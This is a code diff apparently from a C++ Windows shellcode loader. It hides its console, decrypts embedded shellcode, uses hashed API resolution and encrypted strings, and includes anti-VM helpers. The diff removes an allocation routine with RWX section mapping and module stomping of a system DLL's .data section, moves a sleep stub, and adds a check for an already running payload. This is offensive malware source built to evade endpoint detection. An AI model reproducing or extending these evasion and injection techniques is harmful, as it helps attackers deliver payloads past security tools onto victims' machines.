@@ -3,78 +3,17 @@
 #include "Tools.h"
 #include "Struct.h"
 #include "ShellcodeExec.h"
-#include "shellcode.h"
 #include "PIGSyscall.hpp"
 #include "definition.h"
 #include "AntiVm.h"
 #include "Function.hpp"
+#include "shellcode.h"
 
 #include <bcrypt.h>
 #pragma comment(lib, "bcrypt.lib")
 
 static auto& dynamicInvoker = DynamicInvoker::get_instance();
 
-
-
-
-void test() {
-	custom_sleep(500); // sleep 0.5s
-}
-NTSTATUS AllocateMem(LPVOID* lpMem,PSIZE_T size) {
-	NTSTATUS status = 0xC0000001; 
-
-	switch (allocateMethod) {
-	case CASE_NtAllocateVirtualMemory: {
-
-		status = dynamicInvoker.Invoke<NTSTATUS>(NtAllocateVirtualMemoryStruct.funcAddr, NtAllocateVirtualMemoryStruct.funcHash,
-			(HANDLE)-1, lpMem, 0, size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-
-		break;
-	}case CASE_NtMapOfView: {
-		HANDLE hSection = NULL;
-		SIZE_T secSize = *size;
-		LARGE_INTEGER sectionSize = { secSize };
-		pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddressbyHASH(GetMoudlebyName(_wcsdup(ENCRYPT_WSTR("ntdll.dll"))), NtCreateSection_Hashed);
-
-		status = NtCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
-
-		if (NT_SUCCESS(status)) {
-			SIZE_T viewSize = *size;
-			LPVOID mem = NULL;
-
-			pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddressbyHASH(GetMoudlebyName(_wcsdup(ENCRYPT_WSTR("ntdll.dll"))), NtMapViewOfSection_Hashed);
-			status = NtMapViewOfSection(hSection, (HANDLE)-1, lpMem, NULL, NULL, 0, &viewSize, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE);
-
-		}
-		break;
-	}case CASE_ModuleStomping: {
-		HMODULE hModule = myLoadLibrary(ENCRYPT_WSTR("AppVIntegration.dll"));
-
-		if (!hModule) return status;
-		PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
-		PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
-		PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
-
-		// 查找.data段
-		for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
-			if (memcmp(section[i].Name, ENCRYPT_STR(".data"), 5) == 0) {
-				DWORD oldProtect;
-				*lpMem = (LPVOID)((BYTE*)hModule + section[i].VirtualAddress);
-				*size = section[i].Misc.VirtualSize;
-
-				status = dynamicInvoker.Invoke<NTSTATUS>(NtProtectVirtualMemoryStruct.funcAddr,
-					NtProtectVirtualMemoryStruct.funcHash,
-					(HANDLE)-1, lpMem, size, PAGE_READWRITE, &oldProtect);
-				break;
-			}
-		}
-		break;
-	}
-	default:
-		break;
-	}
-	return status;
-}
 void DecryptShellcode(LPVOID lpMem, SIZE_T size) {
 	switch (encryptMethod) {
 	case CASE_XOR: {
@@ -160,9 +99,19 @@ void DecryptShellcode(LPVOID lpMem, SIZE_T size) {
 	}
 }
 
+
+void test() {
+	custom_sleep(500); // sleep 0.5s
+}
+
+
 // Hide Console
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
 // int main() {
+
+	if (isPayloadRunning()) {
+		return 0;
+	}
 
 	test();
 	initAllFunc();
